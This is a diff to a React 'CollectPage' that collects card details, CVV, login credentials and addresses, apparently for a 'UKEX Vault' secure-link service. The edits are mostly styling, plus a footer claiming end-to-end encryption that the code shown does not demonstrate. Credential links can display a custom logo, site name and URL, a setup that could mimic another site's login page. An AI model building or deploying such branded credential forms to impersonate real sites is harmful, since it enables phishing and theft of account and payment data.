@@ -233,14 +233,7 @@ export default function CollectPage() {
   }
 
   if (isLoading) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-slate-900 transition-colors duration-300">
-        <div className="text-center">
-          <div className="w-12 h-12 border-4 border-purple-600 dark:border-purple-400 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-          <p className="text-gray-600 dark:text-gray-400">Loading secure link...</p>
-        </div>
-      </div>
-    )
+    return null // No loading animation - instant display
   }
 
   if (!link) {
@@ -322,7 +315,7 @@ export default function CollectPage() {
     const labelMarginBottom = (link as any).label_margin_bottom || '8px'
     const inputFontSize = (link as any).input_font_size || '16px'
     
-    // Common input style object
+    // Common input style object with responsive design
     const inputStyle = {
       height: inputHeight,
       padding: inputPadding,
@@ -332,15 +325,19 @@ export default function CollectPage() {
       backgroundColor: inputBgColor || undefined,
       color: inputTextColor || undefined,
       borderColor: inputBorderColor || undefined,
+      transition: 'all 0.2s ease-in-out',
+      boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)',
     }
     
-    // Common label style object
+    // Common label style object with responsive design
     const labelStyle = {
       marginBottom: labelMarginBottom,
       color: labelTextColor || undefined,
       backgroundColor: labelBgColor || undefined,
       padding: labelBgColor ? '0.5rem' : undefined,
       borderRadius: labelBgColor ? '0.5rem' : undefined,
+      fontSize: '14px',
+      fontWeight: '600',
     }
     
     if ((link as any).item_type === 'card') {
@@ -356,7 +353,7 @@ export default function CollectPage() {
             <input
               value={formData.cardholderName || ''}
               onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
-              className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+              className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
               style={inputStyle}
               required
             />
@@ -472,7 +469,7 @@ export default function CollectPage() {
                 type="password"
                 value={formData.cvv || ''}
                 onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
-                className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+                className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
                 style={{
                   backgroundColor: inputBgColor || undefined,
                   color: inputTextColor || undefined,
@@ -510,7 +507,7 @@ export default function CollectPage() {
                   type="text"
                   value={formData.username || formData.email || ''}
                   onChange={(e) => setFormData({ ...formData, username: e.target.value, email: e.target.value })}
-                  className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+                  className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
                   style={{
                     backgroundColor: inputBgColor || undefined,
                     color: inputTextColor || undefined,
@@ -578,7 +575,7 @@ export default function CollectPage() {
             <input
               value={formData.fullName || ''}
               onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
-              className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+              className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
               style={{
                 backgroundColor: inputBgColor || undefined,
                 color: inputTextColor || undefined,
@@ -609,7 +606,7 @@ export default function CollectPage() {
               type="email"
               value={formData.email || ''}
               onChange={(e) => setFormData({ ...formData, email: e.target.value })}
-              className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+              className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
               style={{
                 backgroundColor: inputBgColor || undefined,
                 color: inputTextColor || undefined,
@@ -639,7 +636,7 @@ export default function CollectPage() {
               type="tel"
               value={formData.phone || ''}
               onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
-              className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+              className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
               style={{
                 backgroundColor: inputBgColor || undefined,
                 color: inputTextColor || undefined,
@@ -662,7 +659,7 @@ export default function CollectPage() {
             <input
               value={formData.addressLine1 || ''}
               onChange={(e) => setFormData({ ...formData, addressLine1: e.target.value })}
-              className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+              className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
               style={{
                 backgroundColor: inputBgColor || undefined,
                 color: inputTextColor || undefined,
@@ -685,7 +682,7 @@ export default function CollectPage() {
             <input
               value={formData.addressLine2 || ''}
               onChange={(e) => setFormData({ ...formData, addressLine2: e.target.value })}
-              className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+              className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
               style={{
                 backgroundColor: inputBgColor || undefined,
                 color: inputTextColor || undefined,
@@ -709,7 +706,7 @@ export default function CollectPage() {
               <input
                 value={formData.city || ''}
                 onChange={(e) => setFormData({ ...formData, city: e.target.value })}
-                className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+                className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
                 style={{
                   backgroundColor: inputBgColor || undefined,
                   color: inputTextColor || undefined,
@@ -732,7 +729,7 @@ export default function CollectPage() {
               <input
                 value={formData.state || ''}
                 onChange={(e) => setFormData({ ...formData, state: e.target.value })}
-                className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+                className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
                 style={{
                   backgroundColor: inputBgColor || undefined,
                   color: inputTextColor || undefined,
@@ -757,7 +754,7 @@ export default function CollectPage() {
               <input
                 value={formData.zipCode || ''}
                 onChange={(e) => setFormData({ ...formData, zipCode: e.target.value })}
-                className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+                className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
                 style={{
                   backgroundColor: inputBgColor || undefined,
                   color: inputTextColor || undefined,
@@ -780,7 +777,7 @@ export default function CollectPage() {
               <input
                 value={formData.country || ''}
                 onChange={(e) => setFormData({ ...formData, country: e.target.value })}
-                className="w-full focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all placeholder-gray-400 dark:placeholder-gray-500"
+                className="w-full focus:outline-none focus:ring-2 focus:ring-purple-500 dark:focus:ring-purple-400 focus:border-transparent placeholder-gray-400 dark:placeholder-gray-500"
                 style={{
                   backgroundColor: inputBgColor || undefined,
                   color: inputTextColor || undefined,
@@ -826,23 +823,24 @@ export default function CollectPage() {
 
   return (
     <div 
-      className="min-h-screen flex items-center justify-center px-4 py-12 transition-colors duration-300"
+      className="min-h-screen flex flex-col transition-colors duration-300"
       style={backgroundStyle}
     >
-      <div 
-        className="w-full space-y-6"
-        style={{ maxWidth: formWidth ? `${formWidth}px` : '672px' }}
-      >
+      <div className="flex-1 flex items-center justify-center px-4 py-8 sm:py-12">
+        <div 
+          className="w-full space-y-6 sm:space-y-8"
+          style={{ maxWidth: formWidth ? `${formWidth}px` : '672px' }}
+        >
         {/* Site Branding Header - Only show for credential type */}
         {(link as any).item_type === 'credential' && (
-          <div className="text-center mb-6 space-y-4">
+          <div className="text-center mb-6 sm:mb-8 space-y-3 sm:space-y-4 px-4">
             {/* Favicon/Logo Display */}
             {((link as any).custom_favicon_url || (link as any).logo_url) && (
               <div className="flex justify-center">
                 <img 
                   src={(link as any).custom_favicon_url || (link as any).logo_url} 
                   alt="Site Logo" 
-                  className="w-20 h-20 rounded-2xl shadow-lg object-contain bg-white dark:bg-slate-800 p-2 border-2 border-gray-200 dark:border-slate-700"
+                  className="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl shadow-xl object-contain bg-white dark:bg-slate-800 p-2 sm:p-3 border border-gray-200 dark:border-slate-700 transition-transform hover:scale-105"
                   onError={(e) => {
                     (e.target as HTMLImageElement).style.display = 'none'
                   }}
@@ -852,21 +850,21 @@ export default function CollectPage() {
             
             {/* Site Name */}
             {(link as any).site_name && (
-              <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
+              <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold text-gray-900 dark:text-white leading-tight">
                 {(link as any).site_name}
               </h1>
             )}
             
             {/* Site Tagline */}
             {(link as any).site_tagline && (
-              <p className="text-lg text-gray-600 dark:text-gray-400">
+              <p className="text-base sm:text-lg text-gray-600 dark:text-gray-400 max-w-md mx-auto">
                 {(link as any).site_tagline}
               </p>
             )}
             
             {/* Website URL - Only show if enabled */}
             {showUrlOnForm && (link as any).website_url && (
-              <p className="text-sm text-gray-500 dark:text-gray-400">
+              <p className="text-xs sm:text-sm text-gray-500 dark:text-gray-400">
                 {(link as any).website_url}
               </p>
             )}
@@ -875,7 +873,7 @@ export default function CollectPage() {
 
         <form 
           onSubmit={handleSubmit} 
-          className="card shadow-2xl border-2 dark:border-slate-700"
+          className="card shadow-2xl border border-gray-200 dark:border-slate-700 p-6 sm:p-8 md:p-10"
           style={{ 
             backgroundColor: formBg,
             display: 'flex',
@@ -895,9 +893,9 @@ export default function CollectPage() {
           >
             <button
               type="submit"
-              className={`font-bold transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-offset-2 transform active:scale-95 ${
+              className={`font-semibold transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-offset-2 ${
                 (link as any).button_alignment === 'full' ? 'w-full' : 'min-w-[200px]'
-              } ${isSubmitting ? 'opacity-50 cursor-not-allowed' : 'hover:brightness-110'}`}
+              } ${isSubmitting ? 'opacity-60 cursor-not-allowed' : 'hover:brightness-110 active:scale-[0.98]'}`}
               style={{
                 backgroundColor: buttonBg,
                 color: buttonTextColor,
@@ -911,7 +909,6 @@ export default function CollectPage() {
             >
             {isSubmitting ? (
               <span className="flex items-center justify-center gap-2">
-                <div className="w-4 h-4 border-2 border-current border-t-transparent rounded-full animate-spin"></div>
                 Submitting...
               </span>
             ) : (
@@ -920,6 +917,22 @@ export default function CollectPage() {
           </button>
           </div>
         </form>
+
+        {/* Professional Branding Footer */}
+        <div className="mt-8 mb-4 text-center px-4">
+          <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/50 dark:bg-slate-800/50 backdrop-blur-sm rounded-full border border-gray-200 dark:border-slate-700 shadow-sm">
+            <svg className="w-4 h-4 text-purple-600 dark:text-purple-400" fill="currentColor" viewBox="0 0 20 20">
+              <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+            </svg>
+            <span className="text-xs sm:text-sm text-gray-600 dark:text-gray-400 font-medium">
+              Secured by <span className="font-bold text-purple-600 dark:text-purple-400">UKEX Vault</span>
+            </span>
+          </div>
+          <p className="mt-3 text-xs text-gray-500 dark:text-gray-500 max-w-md mx-auto">
+            Your information is encrypted end-to-end and transmitted securely
+          </p>
+        </div>
+      </div>
       </div>
     </div>
   )
